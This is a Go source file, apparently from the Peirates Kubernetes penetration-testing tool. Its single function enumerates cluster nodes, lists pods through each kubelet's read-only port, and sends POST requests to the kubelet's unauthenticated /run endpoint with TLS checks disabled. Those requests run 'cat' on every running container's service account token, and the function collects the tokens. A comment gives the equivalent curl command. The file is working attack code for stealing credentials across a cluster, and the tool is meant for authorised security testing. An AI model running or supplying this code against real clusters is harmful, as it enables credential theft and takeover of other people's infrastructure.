package peirates

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

// ExecuteCodeOnKubelet runs a command on every pod on every node via their Kubelets.
func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]ServiceAccount) {
	println("[+] Getting IP addresses for the nodes in the cluster...")
	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
	if !kubectlAuthCanI(connectionString, "get", "nodes") {
		println("[-] Permission Denied: your service account isn't allowed to get nodes")
		return
	}

	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	println(nodeDetailOut)

	if err != nil {
		println("[-] Unable to retrieve node details: ")
	} else {
		var getnodeDetail GetNodeDetails
		err := json.Unmarshal(nodeDetailOut, &getnodeDetail)
		if err != nil {
			println("[-] Error unmarshaling data in this secret: ", err)
		}

	nodeLoop:
		for _, item := range getnodeDetail.Items {

			for _, addr := range item.Status.Addresses {
				// println("[+] Found IP for node " + item.Metadata.Name + " - " + addr.Address)
				if addr.Type == "Hostname" {
				} else {
					println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
					println("[+] Grabbing Pods from node: " + item.Metadata.Name)

					// Make a request for our service account(s)
					var headers []HeaderLine

					urlSvcAccount := "http://" + addr.Address + ":10255/pods"
					runningPodsBody := GetRequest(urlSvcAccount, headers, false)
					if (runningPodsBody == "") || (strings.HasPrefix(runningPodsBody, "ERROR:")) {
						println("[-] Kubelet request for running pods failed - using this URL:", urlSvcAccount)
						continue nodeLoop
					}

					var output []PodNamespaceContainerTuple
					var podDetails PodDetails
					json.Unmarshal([]byte(runningPodsBody), &podDetails)
					for _, item := range podDetails.Items {
						podName := item.Metadata.Name
						podNamespace := item.Metadata.Namespace
						for _, container := range item.Status.ContainerStatuses {
							running := container.State.Running != nil
							containerName := container.Name
							if running && containerName != "pause" {
								output = append(output, PodNamespaceContainerTuple{
									PodName:       podName,
									PodNamespace:  podNamespace,
									ContainerName: containerName,
								})
								// Let's set up to do the exec via the Kubelet
								tr := &http.Transport{
									TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
								}
								sslClient := &http.Client{Transport: tr}

								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""

								data := url.Values{}
								data.Set("cmd", "cat "+ServiceAccountPath+"token")

								urlExecPod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"

								// reqExecPod, err := http.PostForm(urlExecPod, formData)
								println("===============================================================================================")
								println("Asking Kubelet to dump service account token via URL:", urlExecPod)
								println("")
								reqExecPod, _ := http.NewRequest("POST", urlExecPod, strings.NewReader(data.Encode()))
								reqExecPod.Header.Add("Content-Type", "application/x-www-form-urlencoded")
								reqExecPod.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
								respExecPod, err := sslClient.Do(reqExecPod)
								if err != nil {
									fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlExecPod, err.Error())
									respExecPod.Body.Close()
									continue
								}
								if respExecPod.Status != "200 OK" {
									fmt.Printf("[-] Error - response code: %s\n", respExecPod.Status)
									continue
								}
								defer respExecPod.Body.Close()
								bodyExecCommand, _ := ioutil.ReadAll(respExecPod.Body)
								token := string(bodyExecCommand)
								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
								println("")
								name := "Pod ns:" + podNamespace + ":" + podName
								serviceAccount := MakeNewServiceAccount(name, token, "kubelet")
								*serviceAccounts = append(*serviceAccounts, serviceAccount)
							}
						}
					}
				}
			}
		}
	}
}
